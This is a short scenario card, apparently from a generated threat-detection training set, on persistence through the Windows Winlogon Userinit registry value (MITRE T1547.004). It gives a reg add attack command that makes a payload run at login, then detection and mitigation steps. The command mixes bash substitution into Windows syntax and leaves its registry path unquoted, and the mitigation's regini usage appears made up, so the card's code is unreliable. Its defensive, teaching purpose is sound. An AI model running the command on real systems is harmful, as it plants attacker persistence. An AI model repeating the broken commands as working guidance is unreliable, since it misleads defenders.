---
type: campaign
scenario_id: 153
tactic: Persistence
technique: "T1547.004: Winlogon"
technique_id: T1547.004
tags: [campaign, lotl, persistence]
---

# Modifying Winlogon registry to execute malicious payload on login.

## Threat Description
Modifying Winlogon registry to execute malicious payload on login.

## Attack Command
```
reg add HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe,C:\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)" /f
```

## Detection Logic
Monitor Winlogon changes: `reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit`; Event ID 4657.

## Mitigation
Restrict Winlogon writes: `regini -h deny HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`; Audit registry: Event ID 4657.

## AI Training Prompt
Train AI to detect Winlogon registry tampering and suggest registry protections.

## References
- MITRE ATT&CK T1547.004: https://attack.mitre.org/techniques/T1547/004/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
